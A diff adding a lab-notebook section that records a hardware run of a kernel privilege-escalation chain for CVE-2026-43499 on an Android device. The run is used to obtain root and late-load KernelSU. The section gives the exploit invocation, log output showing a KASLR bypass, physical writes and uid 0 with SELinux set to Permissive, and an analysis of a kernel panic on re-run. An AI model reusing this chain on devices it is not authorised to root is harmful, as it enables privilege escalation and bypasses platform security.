@@ -777,3 +777,102 @@ method as the DZG1 record. Ground truth remains hardware late-load.
   `~/.cargo/git` cache covered the remaining git crates — a clean
   machine still needs the same treatment. DDK-side (`make clean`
   quirk, fallback-version path) is fully logged and replayable.
+
+### 9.6 Full-chain hardware record (2026-11-02, boot `8ae3860a`)
+
+Single-round `LD_PRELOAD` run of the §8.6 release `.so`
+(`9c6cf160…`, 104128 B) + `cve-2026-43499-root` (27264 B, NDK r29
+rebuild `22:47`), staged as `/data/local/tmp/ezif_app.release.so` /
+`/data/local/tmp/ezif_root` (both `7f 45 4c 46`, sizes match).
+Invocation mirrors the DZG1 manual route (no `SLIDE_ONLY`):
+
+`EXPLOIT_ATTEMPTS=24 EXPLOIT_ATTEMPT_TIMEOUT_SEC=300
+P0_ATTEMPT_TIMEOUT_SEC=180 LD_PRELOAD=…ezif_app.release.so
+/system/bin/id`
+
+Run 1 (same boot, attempt **1/24** — full chain, transcript
+`run1_ezif_clean.log` retained in workdir scratch):
+
+```text
+[+] slide-kaslr-ok source=tracefs pid=26261 base=ffffffc008090000 slide=0000000000090000 data_mode=canonical
+[*] p0 physical write status=0 ok=1
+[*] cfi write ret=35 errno=0 / cfi read ret=35 errno=0 (misc_fops target=ffffffc00a46c200)
+[*] phys step probed read done ok=1 / write done ok=1 / read64 done ok=1 value=306365737562656e
+[*] root umh result wake=1 complete=1 retval=0 socket=1
+[+] pipe physrw pid=26261 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
+[+] exploit completed attempt=1/24
+```
+
+- Tracefs quorum unanimous (`best=00090000 hits=6 second=0`), caller
+  `ffffffc00816b39c` dominant; per-boot slide agreement holds.
+- Temp root verified via helper:
+  `uid=0(root) gid=0(root) context=u:r:kernel:s0`, `Permissive`.
+- KSU **v3.3.1** late-load (`ezif_ksud-331`, 5065680 B, SHA-256
+  `fde99b5a…`, staged to hardcoded `KSU_LOADER_PATH`
+  `/data/local/tmp/ksud-s25u-kdp`, SHA re-verified on device):
+  `--ephemeral` rejected as usage error (v3.3.1 `late-load --help`
+  has no such flag — same fallback DZG1 saw on v3.2.5, wrapper
+  retried plain `late-load` as designed). v3.3.1
+  `stage_daemon_from("/data/local/tmp/.ksud-stage")` renames a
+  caller-provided stage file (source-confirmed in
+  `userspace/ksud/src/late_load.rs:44` + `utils.rs:259`) — nothing
+  creates it, so the first plain attempt failed with
+  `Failed to rename /data/local/tmp/.ksud-stage to /data/adb/ksud`.
+  Fix: `cp ezif_ksud-331 /data/local/tmp/.ksud-stage` (shell-writable)
+  before invoking `--late-load`; the rename then consumed it and the
+  module load proceeded. (Side note: `/data/adb` pre-existed from
+  October with a prior KSU setup — `ksud` 4892712 B, `ksu/`,
+  `modules/`, `lspd/`, `zygisksu/` — so the `ensure_dir_exists`
+  branch was a no-op; our run replaced `/data/adb/ksud` with v3.3.1.)
+- Result: `kernelsu ... Live` in `/proc/modules`, SELinux back to
+  `Enforcing`. **Module load proven on EZIF hardware for v3.3.1.**
+- BLOCKER found at late-load: the temp-root client channel died —
+  `/data/local/tmp/temp_su.sock` became un-statable as shell
+  (`s?????????`, `connect daemon: Permission denied`) although the
+  root daemon stayed alive; DAC would have allowed it, so this is a
+  post-`Enforcing`-restore MAC denial on the bootstrap socket.
+  Consequence: `ksud debug` / control-channel check (`KernelSU
+  control verified`), `su` grant, and Manager install/UI were **NOT
+  verified** — `/data/adb` is `drwx------ root` (shell cannot reach
+  `ksud`), and no other root channel exists post-late-load. Manager
+  apk install was skipped per protocol (needs user interaction).
+
+Run 2 (same boot, KSU live, re-invoke for a fresh root window):
+**kernel panic → reboot**. Do not re-run on a KSU-live boot.
+
+- Panic signature (`dumpstate_lastkmsg_130_…_225441_KP`, KTIME
+  1665.76, retained in workdir scratch):
+  `Internal error: Oops: 96000004`, DABT current EL, level-0
+  translation fault on garbage VA `000c631330080006`
+  (`[000c631330080006] address between user and kernel address
+  ranges`), task `id:27079` (run-2 supervisor host),
+  `pc: try_module_get+0x2c` ← `misc_open+0x6c` ← `chrdev_open` ←
+  `do_dentry_open` ← `__arm64_sys_openat`. `x19=x0` = garbage
+  `struct module *`; `x24=ffffffc00a46c208` sits +8 of the known CFI
+  `misc_fops` target `ffffffc00a46c200`. `Modules linked in:
+  kernelsu(O)` first.
+- Run-2 log reached `fops-page-held` (slide re-agreed `0x90000`)
+  before the crash: re-running the CFI/fops stage with the KSU
+  module live corrupted (or raced) the misc registration; the next
+  misc open dereferenced the garbage owner pointer.
+- Device rebooted on its own; new boot `92b4814c`
+  (`ro.boot.bootreason=reboot`), no `kernelsu` in `/proc/modules`
+  (volatile, as expected). Per panic protocol: stopped, pulled
+  lastkmsg, no rapid re-fire.
+
+Boot对照:
+
+| Field | Before (exploit boot) | After |
+| --- | --- | --- |
+| boot_id | `8ae3860a` | `92b4814c` |
+| uptime at session | ~20 min, load ~2.2, free ~160 MB, `boot_completed=1` | ~2 min, load 7.76 (settling), `boot_completed=1` |
+| kernelsu module | absent → **Live** (run 1) | absent (volatile) |
+| SELinux | Enforcing → Permissive (root) → Enforcing (KSU) | Enforcing |
+
+Status vs §9.5: chain root=1 proven (fresh-boot single shot);
+v3.3.1 module load proven; control-channel/`su`/Manager/resetprop/
+repeatability matrix **still TODO**. New rule for EZIF: **one full
+trigger per boot once KSU is late-loaded — same-boot re-invoke
+panics**; post-late-load verification needs a root channel that
+survives the Enforcing restore (temp-root socket currently does
+not), otherwise verify via reboot + fresh run ordering.
